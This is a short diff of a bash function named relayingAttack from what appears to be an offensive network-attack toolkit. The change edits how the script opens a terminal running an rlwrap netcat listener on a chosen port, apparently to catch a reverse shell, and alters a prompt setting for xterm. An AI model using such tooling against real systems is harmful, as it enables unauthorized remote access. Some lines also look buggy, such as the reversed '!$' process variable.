@@ -230,7 +230,7 @@ function relayingAttack(){
     if [[ $? -eq 0 && "$ps" != "tmux" ]];then terminal=$ps; break; fi
   done
 
-  command="$SHELL -c 'tput setaf 7; rlwrap nc -lvvnp $lport; kill -9 $terminal_nc_PID && wait $terminal_nc_PID'"
+  command="$SHELL -c 'tput setaf 7; rlwrap nc -lvvnp $lport'"
   if [ $terminal == "gnome" ];then
     gnome-terminal --window --hide-menubar -e "$command" &> /dev/null &
     terminal_nc_PID=!$
@@ -238,7 +238,7 @@ function relayingAttack(){
     termite -hold -e "$command" &>/dev/null &
     terminal_nc_PID=!$
   else
-    xterm -hold -e "$command" &>/dev/null &
+    xterm -hold -e 'export PS1="\[\033]0;\u@\h: \w\007\]\\$ " $command' &>/dev/null &
     terminal_nc_PID=!$
   fi
 
